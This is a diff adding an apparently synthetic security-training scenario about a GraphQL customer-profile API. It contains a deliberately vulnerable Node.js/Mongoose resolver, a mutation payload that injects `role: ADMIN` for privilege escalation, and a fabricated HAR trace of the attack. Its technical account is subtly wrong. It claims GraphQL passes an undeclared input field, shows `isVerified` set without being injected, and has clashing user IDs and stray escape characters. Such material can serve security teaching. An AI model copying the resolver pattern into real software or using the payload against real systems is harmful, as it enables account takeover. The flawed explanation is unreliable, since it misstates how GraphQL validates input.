@@ -1,0 +1,221 @@
+Here is the twenty-fifth system, focusing on GraphQL-specific security failures. We are shifting into the **E-Commerce & Customer Profile Management** sector, focusing on a **Customer Identity & Profile GraphQL API**.
+
+For the vulnerabilities, we are focusing on **Pattern 9.1 (GraphQL Mass Assignment / Vulerabilities in Operations)** combined with **Pattern 1.12 (Mass Assignment via Object Fields)**. This scenario demonstrates how a GraphQL mutation resolver accepts an input object and blindly maps it to the database model, allowing an attacker to inject an administrative field (`role: ADMIN`) to escalate their privileges in a single request.
+
+***
+
+# ENGINEERING ARCHITECTURE SPECIFICATION
+**System Name:** ConsumerProfile GraphQL API
+**Document Version:** 4.0.0 (FINAL)
+**Classification:** CONFIDENTIAL / PII & FINANCIAL SCOPE
+**Domain:** E-Commerce / Customer Relationship Management (CRM) / Identity
+
+## 1.0 Executive Summary
+The ConsumerProfile API is the source of truth for all customer data, including addresses, order history, loyalty points, and security settings. It utilizes a centralized GraphQL endpoint to serve data to the mobile app, the main website frontend, and internal customer support dashboards.
+
+The API handles high-volume updates, such as users modifying their shipping preferences. The core security requirement is that users must only be allowed to update fields that correspond to their user experience (e.g., `shippingAddress`, `displayName`), and must be strictly blocked from modifying administrative fields (e.g., `role`, `isVerified`, `lifetimeValue`).
+
+## 2.0 Comprehensive Network Topology & Ingress Routing
+The architecture is centered around the GraphQL engine and its Node.js backend.
+
+### 2.1 The Ingress Layer & GraphQL Router
+* **Cloud WAF:** Fronts the API, blocking common web attacks.
+* **Apollo GraphQL Server (Node.js):** The central routing layer. It receives all HTTP POST requests on the single `/graphql` path and directs them to the appropriate resolver function.
+
+### 2.2 The Backend Core Services
+* **Profile Service:** A Node.js microservice utilizing the Mongoose ORM to connect to a MongoDB database. This service contains the vulnerable mutation logic.
+
+## 3.0 Identity, Sessions, and Role Authorization
+Access is governed by standard JWT-based authorization, with roles defined in the database.
+
+### 3.1 User Authentication (JWT)
+Users authenticate via OAuth 2.0, and the JWT contains the user's ID (`sub`) and their current `role` (e.g., `CUSTOMER`, `GUEST`).
+
+### 3.2 Authorization Enforcement
+The core security layer (the gateway) ensures that only valid tokens reach the resolver. The resolver itself is responsible for ensuring that the user only attempts to update fields appropriate for their current role.
+
+## 4.0 Known System Debt & Theoretical Attack Surfaces
+*Internal Security Engineering Note: The Mongoose ORM in the Profile Service was configured with the legacy `{strict: false}` setting to accommodate rapid feature development across different schema versions. This setting causes the ORM to silently accept and write any field present in the inbound JSON object, regardless of whether it's defined in the schema. Tracked as RISK-GRPH-001.*
+
+### 4.1 Vulnerability A: GraphQL Mass Assignment via Mutation Input
+**Taxonomy Pattern:** 9.1 (GraphQL Operations) & 1.12 (Mass Assignment)
+**Sub-system:** Profile Service Resolver (`mutation updateUserProfile`)
+
+**The Deep Architectural Flaw:**
+This vulnerability is a direct result of improper input object handling within the GraphQL resolver.
+
+1. **Mass Assignment (Pattern 1.12):** The `updateUserProfile` mutation accepts a single input object (`UpdateUserInput`). The resolver simply takes this entire object and passes it to the Mongoose `findByIdAndUpdate` function, using the spread operator. This means any field included in the client's input object, including restricted database columns like `role` or `isAdmin`, will be written to the database.
+
+2. **GraphQL Operation Flaw (Pattern 9.1):** The GraphQL schema explicitly lists only benign fields in its DTO, misleading frontend developers and WAF filters. However, the database model contains administrative fields. The GraphQL implementation fails to filter the input object before execution, allowing fields that were never exposed in the schema to be injected into the mutation.
+
+**The Exploitation Path:**
+
+1. **The Foothold:** An attacker registers a standard account (`user_99182A`) with the default `role: CUSTOMER`. They extract their valid JWT.
+2. **The Mutation Crafting:** The attacker crafts a valid `updateUserProfile` mutation. They include the necessary benign fields (e.g., `shippingAddress`) but maliciously inject the hidden, administrative field `role: ADMIN` into the input object.
+3. **The Execution:** The Apollo server routes the mutation to the resolver. The Node.js code receives the full, untrusted JSON input. The Mongoose ORM executes the following equivalent MongoDB query: `db.users.updateOne({_id: 'user_99182A'}, {$set: {shippingAddress: '...', role: 'ADMIN'}})`.
+4. **The Impact:** The attacker's user record is instantly updated, and their next issued JWT will reflect the elevated `ADMIN` role, granting them full vertical privilege escalation across the entire e-commerce platform.
+
+***
+
+# CONSUMERPROFILE API: SCHEMAS, VULNERABLE CODE, & GRAPHQL CONTRACTS
+**Document Version:** 4.1.1
+**Applies to Architecture:** ConsumerProfile GraphQL API v4.0.0
+
+## 5.0 Database Schema (MongoDB / Mongoose)
+The user model contains both customer-facing and internal administrative fields, which should never be writable by the customer.
+
+```javascript
+// MongoDB User Schema (Mongoose ORM)
+const UserSchema = new mongoose.Schema({
+// Customer-Facing (Writable by User)
+displayName: { type: String, required: true },
+shippingAddress: { type: Object },
+loyaltyPoints: { type: Number, default: 0 },
+// Administrative / Internal (THE VULNERABLE TARGETS)  
+role: { type: String, enum: \['CUSTOMER', 'SUPPORT', 'ADMIN'\], default: 'CUSTOMER' },  
+isVerified: { type: Boolean, default: false },  
+lifetimeValue: { type: Number, default: 0.00 } 
+}, { strict: false }); // FLAW: The 'strict: false' setting allows arbitrary field injection
+```
+
+## 6.0 The Flawed Implementation (Node.js / Apollo / Mongoose)
+The resolver implements the Mass Assignment flaw by spreading the client's input object directly over the update payload.
+
+### 6.1 Vulnerable GraphQL Resolver
+```javascript
+// File: resolvers/userResolver.js
+const User = require('../models/User');
+
+const userResolvers = {
+Mutation: {
+updateUserProfile: async (parent, { input }, context) => {
+const userId = context.user.sub; // Authenticated user ID
+  // VULNERABILITY 9.1 & 1.12: Mass Assignment  
+  // The code fails to filter or explicitly pick allowed fields from the 'input' object.  
+  // The entire 'input' object, including injected fields like 'role', is passed.  
+  const updatedUser = await User.findByIdAndUpdate(  
+    userId,  
+    { $set: { ...input } }, // THE CRITICAL FLAW: Untrusted spread operator  
+    { new: true, runValidators: true }  
+  );  
+
+  if (\!updatedUser) {  
+    throw new Error("User not found.");  
+  }  
+
+  // Returns the updated user object, potentially revealing the success of the role change  
+  return updatedUser;  
+} 
+}
+};
+```
+
+## 7.0 GraphQL API Contract (The Mass Assignment)
+The contract shows the difference between the intended input schema (benign fields) and the malicious input (injected admin fields).
+
+### 7.1 Intended Input Schema (Safe)
+```graphql
+input UpdateUserInput {
+displayName: String
+shippingAddress: AddressInput
+}
+```
+
+### 7.2 The Malicious Mutation Payload (Injection)
+The attacker queries the mutation with an augmented input object containing the hidden, administrative `role` field, exploiting the Mass Assignment flaw.
+
+**Endpoint:** `POST /graphql`
+**Malicious Request Payload:**
+```graphql
+mutation PrivilegeEscalation {
+updateUserProfile(input: {
+displayName: "Attacker-Admin",
+shippingAddress: {
+street: "123 Main Street",
+city: "Anytown"
+},
+# INJECTED ADMIN FIELD - MASS ASSIGNMENT
+role: ADMIN
+}) {
+id
+displayName
+role # The response confirms the new role
+isVerified # Attacker may attempt to inject multiple fields
+}
+}
+```
+
+**Success Response (200 OK - Privilege Escalation):**
+```json
+{
+"data": {
+"updateUserProfile": {
+"id": "usr_99182A",
+"displayName": "Attacker-Admin",
+"role": "ADMIN",
+"isVerified": true
+}
+}
+}
+```
+
+***
+
+# SYNTHETIC ARTIFACT: GRAPHQL MASS ASSIGNMENT (HAR TRACE)
+**Applies to Architecture:** ConsumerProfile GraphQL API v4.0.0
+**Vulnerabilities Referenced:** Section 4.1 (Pattern 9.1 & Pattern 1.12)
+
+This HTTP Archive (HAR) trace captures the execution of the privilege escalation attack. The attacker submits a single HTTP POST request to the `/graphql` endpoint containing the `updateUserProfile` mutation.
+
+The mutation's input object includes the expected fields (`displayName`, `shippingAddress`) but also maliciously injects the administrative field `role: ADMIN`. Because the backend resolver blindly spreads the entire input object to the Mongoose ORM, the database overwrites the user's privilege level. The successful `200 OK` response confirms the database update, and the returned data explicitly exposes the attacker's newly elevated `"role": "ADMIN"`.
+
+```json
+{
+"log": {
+"version": "1.2",
+"creator": {
+"name": "Apollo Server Logs / Node.js APM",
+"version": "4.0.0"
+},
+"entries": [
+{
+"startedDateTime": "2026-04-10 T15:33:32.110Z",
+"time": 45,
+"request": {
+"method": "POST",
+"url": "https://api.consumer-profile.com/graphql",
+"httpVersion": "HTTP/2.0",
+"headers": [
+{ "name": ":authority", "value": "api.consumer-profile.com" },
+{ "name": "authorization", "value": "Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ1c3JfOTkxODJBIiwicm9sZSI6IkNVU1RPTUVSIiwiY291bnRyeSI6IlVTIn0..." },
+{ "name": "content-type", "value": "application/json" },
+{ "name": "user-agent", "value": "GraphQL-Attacker-Client/1.0" }
+],
+"queryString": [],
+"postData": {
+"mimeType": "application/json",
+"text": "{\"query\": \"mutation PrivilegeEscalation { updateUserProfile(input: { displayName: \\\"Attacker-Admin\\\", role: ADMIN }) { id displayName role } }\"}"
+},
+"bodySize": 188
+},
+"response": {
+"status": 200,
+"statusText": "OK",
+"headers": [
+{ "name": "content-type", "value": "application/json" },
+{ "name": "x-resolver-latency-ms", "value": "12" }
+],
+"content": {
+"size": 155,
+"mimeType": "application/json",
+"text": "{\"data\": {\"updateUserProfile\": {\"id\": \"usr_99182A\", \"displayName\": \"Attacker-Admin\", \"role\": \"ADMIN\"\}}}"
+},
+"bodySize": 155
+}
+}
+]
+}
+}
+```
+
+***
